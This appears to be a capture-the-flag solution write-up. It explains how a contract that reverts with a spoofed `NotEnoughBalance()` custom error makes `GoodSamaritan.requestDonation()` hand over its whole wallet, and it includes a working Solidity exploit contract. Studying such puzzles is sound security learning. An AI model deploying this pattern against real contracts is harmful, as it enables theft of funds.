# Answer

Goal: Drain balance of `GoodSamaritan` wallet.

## 1. Outside contract call vulnerability

Calling `requestDonation` follows this chain of functions:

`GoodSamaritan.requestDonation()` -> `Wallet.donate10()` -> `Coin.transfer()` -> (if `dest_` is contract) -> `INotifyable(dest_).notify(amount_)` -> transferring...

And here at the `notify(amount_)` is where we get control of the flow. If we take a look back at `GoodSamaritan.requestDonation()` if `wallet.donate10()` fails with an error `NotEnoughBalance()` it transfers all remaining funds to `msg.sender`. Custom errors are not contract dependant, that is it's impossible to tell from which contract the error originated.

So if our `INotifyable(dest_).notify(amount_)` throws this error we'll cause the same behaviour as low funds flow and transfer the whole wallet balance at once.

## 2. Malicious msg.sender contract

The requirements for the malicious `msg.sender` are as follows:

- has to be a contract
- has to implement `INotifyable.notify()` function
- has to check and only throw if the amount is small (10)

The last point is necessary due to after we forcefully fail the initial `deposit10()`, the contract will try to send the remainder balance to the same `msg.sender`. So we have to avoid throwing another `NotEnoughBalance()`. We end up with a contract like this:

```solidity
pragma solidity >=0.8.0 <0.9.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

contract IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance) {}
}

contract MaliciousNotifier is INotifyable {
    error NotEnoughBalance();

    constructor() {}

    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function callGoodSamaritan(address goodSamaritan) external {
        IGoodSamaritan(goodSamaritan).requestDonation();
    }
}
```

## 3. Invoke the exploit

After deploying `MaliciousNotifier` we only need to call the `callGoodSamaritan` with the correct address and all funds will be drained.
